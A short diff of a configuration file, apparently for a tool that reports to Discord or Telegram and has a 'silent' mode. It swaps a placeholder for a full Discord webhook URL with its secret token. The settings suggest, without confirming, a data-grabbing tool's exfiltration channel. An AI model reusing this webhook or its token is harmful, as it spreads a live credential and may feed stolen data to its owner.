@@ -5,6 +5,6 @@ silent = False
 update = False
 discord = True
 telegram = False
-webhook = "<Your Telegram Bot TOKEN or Discord Webhook>"
+webhook = "https://discord.com/api/webhooks/1101101525239091210/ltfekS2IcBRIqpv5ejWxQgmRtO1djIL3X4qanKDhwGu2akUSqgBhvfWBnOaOdCKUbjtX"
 chat_id = 11111111 #<Telegram Chat-id>
 platform = "all"
